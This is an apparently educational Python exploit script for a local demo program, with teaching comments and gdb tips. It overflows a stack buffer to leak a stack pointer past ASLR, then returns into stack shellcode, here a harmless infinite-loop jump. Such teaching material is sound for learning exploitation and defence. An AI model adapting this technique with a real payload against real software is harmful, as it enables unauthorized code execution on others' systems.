#!/usr/bin/python3

import struct
import subprocess

FILENAME  = "./demo"
PADSZ     = 0x20
LEAKADDR  = 0x401036
SHELLCODE = b"\xeb\xfe"

# this is a good time to also show a few helpful gdb tricks
# like:
#   r < ./input.txt
#   r <<< $(python3 ./mypythonscript.py)
#   r <<< $(python3 -c "print('A'*0x500)")
#   attach <pid>

sp = subprocess.Popen(["./demo"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

print(sp.stdout.readline())

# first time we set up a leak
# we replace the saved return to make it write
# and it will write stack contents
# the first qword being a saved stack pointer
outbuf = b""
outbuf += b"A" * PADSZ
outbuf += struct.pack('Q', LEAKADDR)

sp.stdin.write(outbuf)
sp.stdin.flush()

# parse the stack pointer
# this leak defeats ASLR moving the stack around
leaked = struct.unpack('Q', sp.stdout.read(8))[0]
sp.stdout.flush()

# now we have an opportunity to write again
# we write offset from the leaked pointer
# and we will return to our shellcode
# the shellcode in this example
# is just a simple EBFE jump loop
outbuf = b""
outbuf += b"A" * PADSZ
outbuf += struct.pack('Q', leaked+0x20)
outbuf += SHELLCODE

sp.stdin.write(outbuf)
sp.stdin.flush()

print(f"Inserted ebfe in {sp.pid}")

# we can attach with gdb to see
# that it is really executing on the stack

# this will wait forever
sp.wait()

print("Finished")

